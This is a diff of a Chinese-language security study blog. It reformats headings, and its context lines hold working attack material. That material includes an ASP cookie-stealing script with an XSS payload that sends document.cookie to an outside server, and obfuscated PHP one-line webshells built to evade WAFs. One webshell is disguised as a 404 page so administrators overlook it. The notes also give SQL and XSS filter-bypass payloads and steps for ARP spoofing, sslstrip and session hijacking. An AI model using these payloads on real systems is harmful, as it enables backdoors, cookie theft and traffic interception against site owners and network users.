@@ -378,7 +378,7 @@
 <p>Exp 2<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line"></div><div class="line">&lt;title&gt;xx&lt;/title&gt;</div><div class="line"></div><div class="line">&lt;body&gt;</div><div class="line"></div><div class="line">&lt;%testfile = Server.MapPath(<span class="string">"code.txt"</span>) //先构造一个路径，也就是取网站根目录，创造一个在根目录下的code.txt路径，保存在testfile中</div><div class="line"></div><div class="line">msg = Request(<span class="string">"msg"</span>) //获取提交过来的msg变量，也就是cookie值</div><div class="line"></div><div class="line"><span class="built_in">set</span> fs = server.CreateObject(<span class="string">"scripting.filesystemobject"</span>)//创建一个fs对象</div><div class="line"></div><div class="line"><span class="built_in">set</span> thisfile = fs.OpenTextFile(testfile,8,True,0)</div><div class="line"></div><div class="line">thisfile.WriteLine(<span class="string">""</span>&amp;msg&amp;<span class="string">""</span>)//像code.txt中写入获取来的cookie</div><div class="line"></div><div class="line">thisfile.close() //关闭</div><div class="line"></div><div class="line"><span class="built_in">set</span> fs = nothing%&gt;</div><div class="line"></div><div class="line">&lt;/body&gt;</div><div class="line"></div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
 <p>把上述文件保存为cookie.asp文件，放到自己的网站服务器下<br>xss构造为<br><code>&lt;script&gt;window.open(&#39;http://10.10.10.10/cookie.asp?msg=&#39;+document.cookie)&lt;/script&gt;</code></p>
 <p>点击留言页面后进入后页面会跳转，此时cookie就发送到自己的服务器下的code.txt文件中了</p>
-<h3 id="DOM-XSS"><a href="#DOM-XSS" class="headerlink" title="DOM XSS"></a>DOM XSS</h3><p>DOM XSS是基于在js上的。而且他不需要与服务端进行交互，像反射、储蓄都需要服务端的反馈来构造xss，但是服务端对我们是不可见的</p>
+<h3 id="DOM-Based-XSS"><a href="#DOM-Based-XSS" class="headerlink" title="DOM Based XSS"></a>DOM Based XSS</h3><p>DOM XSS 从效果上来说也是反射型<br>DOM XSS是基于在js上的。而且他不需要与服务端进行交互，像反射、储蓄都需要服务端的反馈来构造xss，但是服务端对我们是不可见的</p>
 <p>file:///C:/Users/Administrator/Desktop/1.html<br>在1.html后面输入<br><code>&lt;script&gt;document.write(document.URL.substring(document.URL.indexOf(&quot;a=&quot;+2,document.URL.length));&lt;/script&gt;</code></p>
 <p>Document.write是把里面的内容写到页面里</p>
 <p>document.URL是获取URL地址</p>
@@ -522,15 +522,14 @@
       
         
           
-            <p>听学长说现在web很多都要花式bypass waf<br>刚好才理解一点一句话木马 看到一篇升级版一句话<br>即关于其无特征bupass waf的文章 先记录下来</p>
+            <h3 id="一句话-bypass-waf"><a href="#一句话-bypass-waf" class="headerlink" title="一句话 bypass_waf"></a>一句话 bypass_waf</h3><p>听学长说现在web很多都要花式bypass waf<br>刚好才理解一点一句话木马 看到一篇升级版一句话<br>即关于其无特征bupass waf的文章 先记录下来</p>
 <p>（也看到了一篇sql和xss绕waf的 挺不错的 记录在下面）</p>
 <p>姿势一 php动态函数 （无eval）<br><code>&lt;?php $_POST[&#39;xx&#39;]($_POST[&#39;oo&#39;]);?&gt;</code><br>利用 在hackbar Post data<br>写入xx=assert￥oo=QAQ</p>
 <p>姿势二 无Post<br>getallheaders函数能够获取请求头内容<br><code>&lt;?php eval(getallheaders()[&#39;Accept-Language&#39;]);&gt;</code><br>结合姿势一<br><code>&lt;?php $a=getallheaders()[&#39;xxx&#39;];$a(getallheaders()[&#39;ooo&#39;]);&gt;</code></p>
 <p>姿势三 遇到会检测http请求头内容的waf<br><code>&lt;?php eval(gzuncompress(base64_decode(getallheaders()[&#39;xx&#39;])));&gt;</code><br>解开之后发现是乱码，waf识别不出来里面的内容<br>结合姿势一<br><code>&lt;?php $xx=gzuncompress(base64_decode(getallheaders()[&#39;xx&#39;]));$xx(gzuncompress(base64_decode(getallheaders()[&#39;oo&#39;])));&gt;</code></p>
 <p>姿势四 防止管理员删shell&gt;伪装成404</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE HTML PUBLIC <span class="string">"-//IETF//DTD HTML 2.0//EN"</span>&gt;</div><div class="line">&lt;html&gt;&lt;head&gt;</div><div class="line">&lt;title&gt;404 Not Found&lt;/title&gt;</div><div class="line">&lt;/head&gt;&lt;body&gt;</div><div class="line">&lt;h1&gt;Not Found&lt;/h1&gt;</div><div class="line">&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;</div><div class="line"> </div><div class="line">...</div><div class="line"> </div><div class="line">&lt;?php</div><div class="line"><span class="variable">$xx</span>=getallheaders()[<span class="string">'xx'</span>];</div><div class="line"><span class="variable">$oo</span>=getallheaders()[<span class="string">'oo'</span>];</div><div class="line"><span class="keyword">if</span>(<span class="variable">$xx</span>!=<span class="string">""</span> and <span class="variable">$oo</span>!=<span class="string">""</span>)&#123;</div><div class="line">  <span class="variable">$xx</span>=gzuncompress(base64_decode(<span class="variable">$xx</span>));<span class="variable">$xx</span>(gzuncompress(base64_decode(<span class="variable">$oo</span>)));</div><div class="line">&#125;</div><div class="line">&gt;</div><div class="line">&lt;/body&gt;&lt;/html&gt;</div></pre></td></tr></table></figure>
-<p>SQl XSS bypass waf</p>
-<p>姿势一 大小写转换<br>SQL：<code>sEleCt vERsIoN()</code><br>XSS：<code>&lt;sCrIpt&gt;aleRt(1)&lt;/scrIpt&gt;</code></p>
+<h3 id="SQl-XSS-bypass-waf"><a href="#SQl-XSS-bypass-waf" class="headerlink" title="SQl XSS bypass waf"></a>SQl XSS bypass waf</h3><p>姿势一 大小写转换<br>SQL：<code>sEleCt vERsIoN()</code><br>XSS：<code>&lt;sCrIpt&gt;aleRt(1)&lt;/scrIpt&gt;</code></p>
 <p>姿势二 字符编码<br>SQL：<code>load_file(0x633A2F77696E646F77732F6D792E696E69)</code><br>XSS：<code>&lt;script%20src%3D&quot;http%3A%2F%2F0300.0250.0000.0001&quot;&gt;&lt;%2Fscript&gt;</code></p>
 <p>姿势三 拼凑法 其只验证一次<br>SQL：<code>selselectect verversionsion();</code><br>XSS：<code>&lt;scr&lt;script&gt;rip&gt;alalertert&lt;/scr&lt;/script&gt;rip&gt;</code></p>
 <p>姿势四 干扰字符污染法：<br>空字符 空格 TAB换行 注释 特殊的函数等等都可以<br><code>SQL：sEleCt+1-1+vERsIoN   /*!*/       ();</code>yohehe‍‍<code>`‍‍SQL2：select/*!*/</code>version<code>()</code></p>
@@ -805,13 +804,13 @@
       
         
           
-            <p>内网视频学习笔记(￣▽￣)~*<br>一、局域网断网攻击<br>虚拟机 kali linux<br>arpspoof -i 网卡 -t ip 网关<br>查别人的 ip fping-asg x.0/24<br>linux ifconfig windows ipcomfig</p>
-<p>二、arp 欺骗<br>先输入 ech0 1&gt;/proc/sys/net/ipv4/ip_forward 无回显<br>可用cat 看是否成功 cat/proc/sys/net/ipv4/ip_forward<br>再arpspoof …</p>
-<p>三、driffnet 获取本机网卡图片<br>driffnet -i 网卡<br>会弹一个小窗口<br>可在/tmp内找到图片</p>
-<p>四、http<br>ettercap dns欺骗 流量嗅探<br>先arp欺骗 再 ettercap-Tq-i eth0<br>(Tq 启动文本模式 q安静模式)</p>
-<p>五、https<br>sslstrip 将https链接还原为http （缺点：证书错误）<br>首先设置 使用 vim esc+:q!不保存退出 esc+:wq保存退出<br>vim/etc/ettercap/etter.conf<br>光标移动到 linux 删除下两个# 设置完成<br>sslstrip -a -f -k</p>
-<p>六、会话劫持<br>wireshark 抓包 ferret重新生成抓包后文件 hamster重放流量 </p>
-<p>way1 先arp欺骗<br>输入wireshark 为图形界面<br>抓包并保存为QAQ.pacp文件<br>再ferret -r QAQ.pacp<br>生成txt文件 将该文件复制到<br>cp hamster.txt /root/<br>输入 hamster 根据提示<br>修改浏览器代理设置<br>进入网址</p>
+            <p>内网视频学习笔记(￣▽￣)~*</p>
+<h3 id="局域网断网攻击"><a href="#局域网断网攻击" class="headerlink" title="局域网断网攻击"></a>局域网断网攻击</h3><p>虚拟机 kali linux<br>arpspoof -i 网卡 -t ip 网关<br>查别人的 ip fping-asg x.0/24<br>linux ifconfig windows ipcomfig</p>
+<h3 id="arp-欺骗"><a href="#arp-欺骗" class="headerlink" title="arp 欺骗"></a>arp 欺骗</h3><p>先输入 ech0 1&gt;/proc/sys/net/ipv4/ip_forward 无回显<br>可用cat 看是否成功 cat/proc/sys/net/ipv4/ip_forward<br>再arpspoof …</p>
+<h3 id="driffnet-获取本机网卡图片"><a href="#driffnet-获取本机网卡图片" class="headerlink" title="driffnet 获取本机网卡图片"></a>driffnet 获取本机网卡图片</h3><p>driffnet -i 网卡<br>会弹一个小窗口<br>可在/tmp内找到图片</p>
+<h3 id="http"><a href="#http" class="headerlink" title="http"></a>http</h3><p>ettercap dns欺骗 流量嗅探<br>先arp欺骗 再 ettercap-Tq-i eth0<br>(Tq 启动文本模式 q安静模式)</p>
+<h3 id="https"><a href="#https" class="headerlink" title="https"></a>https</h3><p>sslstrip 将https链接还原为http （缺点：证书错误）<br>首先设置 使用 vim esc+:q!不保存退出 esc+:wq保存退出<br>vim/etc/ettercap/etter.conf<br>光标移动到 linux 删除下两个# 设置完成<br>sslstrip -a -f -k</p>
+<h3 id="会话劫持"><a href="#会话劫持" class="headerlink" title="会话劫持"></a>会话劫持</h3><p>way1 先arp欺骗<br>wireshark 抓包 ferret重新生成抓包后文件 hamster重放流量<br>输入wireshark 为图形界面<br>抓包并保存为QAQ.pacp文件<br>再ferret -r QAQ.pacp<br>生成txt文件 将该文件复制到<br>cp hamster.txt /root/<br>输入 hamster 根据提示<br>修改浏览器代理设置<br>进入网址</p>
 <p>way2<br>ferret -i eth0(网卡)<br>浏览器设置同上<br>再hamster （若有hamster文件存在需先删除）<br>进入网址同步获取</p>
 <p>way3<br><em>cookie cadger</em><br>工具一键劫持</p>
 
